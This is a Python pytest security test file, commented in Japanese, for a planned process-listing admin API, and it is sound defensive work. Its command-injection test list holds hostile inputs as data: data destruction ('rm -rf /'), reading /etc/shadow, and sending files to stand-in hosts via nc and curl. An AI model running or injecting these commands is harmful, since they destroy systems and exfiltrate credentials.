"""
Running Processes モジュール - セキュリティテスト

CLAUDE.md のセキュリティ原則を検証
"""

import subprocess
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

# テストデータ
FORBIDDEN_CHARS = [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?", "{", "}", "[", "]"]

PASSWORD_KEYWORDS = ["password", "passwd", "token", "key", "secret", "auth"]


class TestProcessesCommandInjection:
    """コマンドインジェクション防止テスト"""

    @pytest.mark.parametrize(
        "malicious_filter",
        [
            # セミコロン（コマンド連結）
            "nginx; rm -rf /",
            "nginx; cat /etc/shadow",
            "nginx; whoami",
            # パイプ（コマンド連結）
            "nginx | nc attacker.com 1234",
            "nginx | base64 /etc/passwd",
            "nginx | curl http://evil.com -d @/etc/shadow",
            # アンパサンド（バックグラウンド実行）
            "nginx & whoami",
            "nginx && cat /etc/shadow",
            "nginx || ls -la /root",
            # コマンド置換
            "nginx $(cat /etc/passwd)",
            "nginx $(whoami)",
            "nginx `id`",
            "nginx `curl http://evil.com`",
            # リダイレクション
            "nginx > /tmp/hacked",
            "nginx >> /var/log/hacked",
            "nginx < /etc/passwd",
            "nginx 2>&1 | tee /tmp/output",
            # ワイルドカード
            "nginx*",
            "nginx?",
            # ブレース展開
            "nginx{1,2,3}",
            "nginx{a..z}",
            # 改行文字
            "nginx\nrm -rf /",
            "nginx\rwhoami",
        ],
    )
    def test_reject_command_injection_in_filter(self, malicious_filter: str):
        """フィルタ文字列のコマンドインジェクションを拒否"""
        # NOTE: processes.py が実装されるまではスキップ
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessFilterRequest
        #
        # with pytest.raises(ValueError, match="Forbidden character|Invalid characters"):
        #     ProcessFilterRequest(filter=malicious_filter)

    @pytest.mark.parametrize("forbidden_char", FORBIDDEN_CHARS)
    def test_reject_each_forbidden_char(self, forbidden_char: str):
        """FORBIDDEN_CHARS の各文字を個別に検証"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessFilterRequest
        #
        # malicious_filter = f"nginx{forbidden_char}ls"
        #
        # with pytest.raises(ValueError, match="Forbidden character"):
        #     ProcessFilterRequest(filter=malicious_filter)

    @pytest.mark.parametrize(
        "safe_filter",
        [
            "nginx",
            "postgresql",
            "postgresql-12",
            "python3.9",
            "node_app",
            "redis-server",
            "my_app",
            "app.service",
        ],
    )
    def test_accept_safe_filter(self, safe_filter: str):
        """安全なフィルタ文字列は許可"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessFilterRequest
        #
        # request = ProcessFilterRequest(filter=safe_filter)
        # assert request.filter == safe_filter

    def test_reject_too_long_filter(self):
        """フィルタ文字列が長すぎる場合は拒否"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessFilterRequest
        #
        # long_filter = "a" * 101  # 100文字超過
        #
        # with pytest.raises(ValidationError, match="max_length"):
        #     ProcessFilterRequest(filter=long_filter)

    def test_reject_empty_filter(self):
        """空文字列のフィルタは拒否（オプション）"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化（空文字列を拒否する場合）
        # from backend.api.routes.processes import ProcessFilterRequest
        #
        # with pytest.raises(ValidationError, match="min_length"):
        #     ProcessFilterRequest(filter="")


class TestProcessesPIDValidation:
    """PID バリデーションテスト"""

    @pytest.mark.parametrize(
        "invalid_pid",
        [
            -1,  # 負の値
            0,  # ゼロ
            4194305,  # 最大値超過
            9999999,  # 大きすぎる値
        ],
    )
    def test_reject_invalid_pid(self, invalid_pid: int):
        """無効な PID を拒否"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessPIDRequest
        #
        # with pytest.raises(ValidationError):
        #     ProcessPIDRequest(pid=invalid_pid)

    @pytest.mark.parametrize(
        "valid_pid",
        [
            1,  # 最小値
            100,
            1000,
            65536,
            4194304,  # 最大値
        ],
    )
    def test_accept_valid_pid(self, valid_pid: int):
        """有効な PID を許可"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessPIDRequest
        #
        # request = ProcessPIDRequest(pid=valid_pid)
        # assert request.pid == valid_pid

    def test_reject_non_integer_pid(self):
        """非整数の PID を拒否"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessPIDRequest
        # from pydantic import ValidationError
        #
        # with pytest.raises(ValidationError):
        #     ProcessPIDRequest(pid="abc")  # 文字列
        #
        # with pytest.raises(ValidationError):
        #     ProcessPIDRequest(pid=12.34)  # 浮動小数点

    def test_pid_boundary_values(self):
        """PID の境界値テスト"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import ProcessPIDRequest
        #
        # # 最小値-1（拒否）
        # with pytest.raises(ValidationError):
        #     ProcessPIDRequest(pid=0)
        #
        # # 最小値（許可）
        # request = ProcessPIDRequest(pid=1)
        # assert request.pid == 1
        #
        # # 最大値（許可）
        # request = ProcessPIDRequest(pid=4194304)
        # assert request.pid == 4194304
        #
        # # 最大値+1（拒否）
        # with pytest.raises(ValidationError):
        #     ProcessPIDRequest(pid=4194305)


class TestProcessesRBAC:
    """RBAC（ロールベースアクセス制御）テスト"""

    def test_viewer_can_list_processes(self, test_client, viewer_headers):
        """Viewer はプロセス一覧を取得可能"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes", headers=viewer_headers)
        # assert response.status_code == 200
        # assert isinstance(response.json(), list)

    def test_viewer_cannot_see_environ(self, test_client, viewer_headers):
        """Viewer は環境変数フィールドを閲覧不可"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=viewer_headers)
        #
        # if response.status_code == 200:
        #     process = response.json()
        #     # environ フィールドが存在しない、または空
        #     assert "environ" not in process or process["environ"] is None

    def test_viewer_sees_masked_cmdline(self, test_client, viewer_headers):
        """Viewer はコマンドライン引数がマスクされる"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=viewer_headers)
        #
        # if response.status_code == 200:
        #     process = response.json()
        #     cmdline = process.get("cmdline", [])
        #
        #     # パスワード含む引数がマスクされている
        #     for arg in cmdline:
        #         if any(kw in arg.lower() for kw in PASSWORD_KEYWORDS):
        #             assert "***REDACTED***" in arg or arg == "***REDACTED***"

    def test_operator_can_list_processes(self, test_client, operator_headers):
        """Operator はプロセス一覧を取得可能"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes", headers=operator_headers)
        # assert response.status_code == 200

    def test_operator_sees_masked_cmdline(self, test_client, operator_headers):
        """Operator もコマンドライン引数がマスクされる"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=operator_headers)
        #
        # if response.status_code == 200:
        #     process = response.json()
        #     cmdline = process.get("cmdline", [])
        #
        #     # 機密情報はマスク
        #     for arg in cmdline:
        #         if any(kw in arg.lower() for kw in PASSWORD_KEYWORDS):
        #             assert "***REDACTED***" in arg

    def test_admin_can_see_all_fields(self, test_client, admin_headers):
        """Admin は全フィールドを閲覧可能（マスクなし）"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=admin_headers)
        #
        # if response.status_code == 200:
        #     process = response.json()
        #
        #     # 全フィールドが存在
        #     assert "cmdline" in process
        #     # environ の取得は設計次第（要確認）
        #     # assert "environ" in process

    def test_admin_sees_unmasked_cmdline(self, test_client, admin_headers):
        """Admin はマスクなしでコマンドライン引数を閲覧可能"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=admin_headers)
        #
        # if response.status_code == 200:
        #     process = response.json()
        #     cmdline = process.get("cmdline", [])
        #
        #     # マスクされていない（REDACTED が含まれない）
        #     # ただし、実際のプロセスにパスワードがあるかは不確定
        #     # このテストは、マスクロジックがAdminに適用されないことを確認
        #     assert all("***REDACTED***" not in arg for arg in cmdline)


class TestProcessesRateLimit:
    """レート制限テスト"""

    def test_rate_limit_processes_list(self, test_client, auth_headers):
        """プロセス一覧のレート制限（60 req/min）"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # # 60回リクエスト
        # for i in range(60):
        #     response = test_client.get("/api/processes", headers=auth_headers)
        #     assert response.status_code == 200, f"Request {i+1} failed"
        #
        # # 61回目で 429 エラー
        # response = test_client.get("/api/processes", headers=auth_headers)
        # assert response.status_code == 429
        # assert "rate limit" in response.json()["detail"].lower()

    def test_rate_limit_processes_detail(self, test_client, auth_headers):
        """プロセス詳細のレート制限（120 req/min）"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # # 120回リクエスト
        # for i in range(120):
        #     response = test_client.get("/api/processes/1", headers=auth_headers)
        #     # 存在しないPIDでも200または404（レート制限には引っかからない）
        #     assert response.status_code in [200, 404], f"Request {i+1} failed"
        #
        # # 121回目で 429 エラー
        # response = test_client.get("/api/processes/1", headers=auth_headers)
        # assert response.status_code == 429

    def test_rate_limit_per_user(self, test_client, user1_headers, user2_headers):
        """レート制限はユーザー単位（独立）"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # # user1 が 60回リクエスト
        # for _ in range(60):
        #     test_client.get("/api/processes", headers=user1_headers)
        #
        # # user1 は制限に引っかかる
        # response = test_client.get("/api/processes", headers=user1_headers)
        # assert response.status_code == 429
        #
        # # user2 は影響なし
        # response = test_client.get("/api/processes", headers=user2_headers)
        # assert response.status_code == 200


class TestProcessesAuditLog:
    """監査ログテスト"""

    def test_audit_log_on_process_list_success(self, test_client, auth_headers, audit_log):
        """プロセス一覧取得成功時の監査ログ記録"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes?filter=nginx", headers=auth_headers)
        # assert response.status_code == 200
        #
        # # 監査ログ確認
        # logs = audit_log.query(
        #     user_role="Admin",
        #     requesting_user_id="admin@example.com",
        #     operation="process_list",
        #     limit=1
        # )
        #
        # assert len(logs) >= 1
        # log_entry = logs[0]
        #
        # assert log_entry["operation"] == "process_list"
        # assert log_entry["target"] == "all"
        # assert log_entry["status"] == "success"
        # assert log_entry["details"]["filter"] == "nginx"

    def test_audit_log_on_process_detail_success(self, test_client, auth_headers, audit_log):
        """プロセス詳細取得成功時の監査ログ記録"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=auth_headers)
        #
        # # 存在しないPIDでも監査ログは記録される
        # logs = audit_log.query(
        #     user_role="Admin",
        #     requesting_user_id="admin@example.com",
        #     operation="process_detail",
        #     limit=1
        # )
        #
        # assert len(logs) >= 1
        # log_entry = logs[0]
        #
        # assert log_entry["operation"] == "process_detail"
        # assert log_entry["target"] == "pid:1"

    def test_audit_log_on_validation_failure(self, test_client, auth_headers, audit_log):
        """入力検証失敗時の監査ログ記録"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # # 不正なフィルタでリクエスト
        # response = test_client.get("/api/processes?filter=nginx;ls", headers=auth_headers)
        # assert response.status_code == 422  # Validation Error
        #
        # # 監査ログ確認
        # logs = audit_log.query(
        #     user_role="Admin",
        #     requesting_user_id="admin@example.com",
        #     operation="process_list",
        #     status="failure",
        #     limit=1
        # )
        #
        # assert len(logs) >= 1
        # log_entry = logs[0]
        #
        # assert log_entry["status"] == "failure"
        # assert "validation" in log_entry["details"].get("error", "").lower() or \
        #        "forbidden" in log_entry["details"].get("error", "").lower()

    def test_audit_log_includes_client_ip(self, test_client, auth_headers, audit_log):
        """監査ログにクライアントIPが記録される"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes", headers=auth_headers)
        # assert response.status_code == 200
        #
        # logs = audit_log.query(
        #     user_role="Admin",
        #     requesting_user_id="admin@example.com",
        #     operation="process_list",
        #     limit=1
        # )
        #
        # log_entry = logs[0]
        # assert "client_ip" in log_entry["details"]
        # # テストクライアントのIPは通常 "testclient"
        # assert log_entry["details"]["client_ip"] is not None


class TestProcessesSensitiveData:
    """機密情報保護テスト"""

    def test_mask_password_in_cmdline(self):
        """コマンドライン引数のパスワードマスク"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import mask_sensitive_cmdline
        #
        # cmdline = ["mysql", "-u", "root", "-pSecretPassword123"]
        # masked = mask_sensitive_cmdline(cmdline, user_role="Viewer")
        #
        # # パスワード引数がマスクされている
        # assert "SecretPassword123" not in str(masked)
        # assert "***REDACTED***" in masked

    @pytest.mark.parametrize(
        "password_arg",
        [
            "-pSecretPass",
            "--password=MySecret",
            "--db-password MySecret",
            "--token=ApiKey12345",
            "--auth-key=Secret",
            "--secret=TopSecret",
        ],
    )
    def test_detect_password_keywords(self, password_arg: str):
        """パスワード関連キーワードの検出"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import contains_password
        #
        # assert contains_password(password_arg) is True

    @pytest.mark.parametrize(
        "safe_arg",
        [
            "-u",
            "root",
            "--host=localhost",
            "--port=3306",
            "nginx",
            "/usr/bin/python",
        ],
    )
    def test_not_detect_safe_args(self, safe_arg: str):
        """安全な引数はマスクされない"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import contains_password
        #
        # assert contains_password(safe_arg) is False

    def test_admin_sees_unmasked_data(self):
        """Admin はマスクされていないデータを閲覧可能"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # from backend.api.routes.processes import mask_sensitive_cmdline
        #
        # cmdline = ["mysql", "-u", "root", "-pSecretPassword"]
        # unmasked = mask_sensitive_cmdline(cmdline, user_role="Admin")
        #
        # # Admin はマスクなし
        # assert "SecretPassword" in str(unmasked)
        # assert "***REDACTED***" not in str(unmasked)

    def test_environ_excluded_for_viewer(self, test_client, viewer_headers):
        """Viewer には環境変数が返されない"""
        pytest.skip("Waiting for backend.api.routes.processes implementation")

        # 実装後は以下を有効化
        # response = test_client.get("/api/processes/1", headers=viewer_headers)
        #
        # if response.status_code == 200:
        #     process = response.json()
        #     assert "environ" not in process or process["environ"] is None


class TestProcessesSecurityPrinciples:
    """セキュリティ原則検証テスト（静的解析）"""

    @pytest.fixture(scope="class")
    def project_root(self):
        """プロジェクトルート"""
        return Path(__file__).parent.parent.parent

    def test_no_shell_true_in_processes_module(self, project_root):
        """processes モジュールに shell=True が存在しないこと"""
        processes_file = project_root / "backend/api/routes/processes.py"

        if not processes_file.exists():
            pytest.skip("processes.py not yet implemented")

        result = subprocess.run(
            ["grep", "-n", "shell=True", str(processes_file)],
            capture_output=True,
            text=True,
        )

        # 検出されない場合は returncode != 0
        assert (
            result.returncode != 0
        ), f"shell=True detected in processes.py:\n{result.stdout}"

    def test_no_os_system_in_processes_module(self, project_root):
        """processes モジュールに os.system が存在しないこと"""
        processes_file = project_root / "backend/api/routes/processes.py"

        if not processes_file.exists():
            pytest.skip("processes.py not yet implemented")

        result = subprocess.run(
            ["grep", "-En", r"os\.system\s*\(", str(processes_file)],
            capture_output=True,
            text=True,
        )

        assert (
            result.returncode != 0
        ), f"os.system detected in processes.py:\n{result.stdout}"

    def test_no_eval_exec_in_processes_module(self, project_root):
        """processes モジュールに eval/exec が存在しないこと"""
        processes_file = project_root / "backend/api/routes/processes.py"

        if not processes_file.exists():
            pytest.skip("processes.py not yet implemented")

        result = subprocess.run(
            ["grep", "-En", r"\b(eval|exec)\s*\(", str(processes_file)],
            capture_output=True,
            text=True,
        )

        assert (
            result.returncode != 0
        ), f"eval/exec detected in processes.py:\n{result.stdout}"

    def test_wrapper_has_set_euo_pipefail(self, project_root):
        """ラッパースクリプトに set -euo pipefail が存在すること"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        content = wrapper_file.read_text()

        assert (
            "set -euo pipefail" in content
        ), "adminui-processes.sh must have 'set -euo pipefail'"

    def test_wrapper_validates_special_chars(self, project_root):
        """ラッパースクリプトに特殊文字検証が存在すること"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        content = wrapper_file.read_text()

        # FORBIDDEN_CHARS変数が定義されていること
        assert (
            "FORBIDDEN_CHARS=" in content
        ), "Wrapper must define FORBIDDEN_CHARS variable"

        # 禁止文字パターンに危険な文字が含まれていること
        for char in [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?"]:
            assert char in content, f"Wrapper FORBIDDEN_CHARS must include '{char}'"

    def test_no_bash_c_in_wrapper(self, project_root):
        """ラッパースクリプトに bash -c が存在しないこと"""
        wrapper_file = project_root / "wrappers/adminui-processes.sh"

        if not wrapper_file.exists():
            pytest.skip("Wrapper script not yet implemented")

        result = subprocess.run(
            ["grep", "-n", "bash -c", str(wrapper_file)],
            capture_output=True,
            text=True,
        )

        assert (
            result.returncode != 0
        ), f"bash -c detected in adminui-processes.sh:\n{result.stdout}"
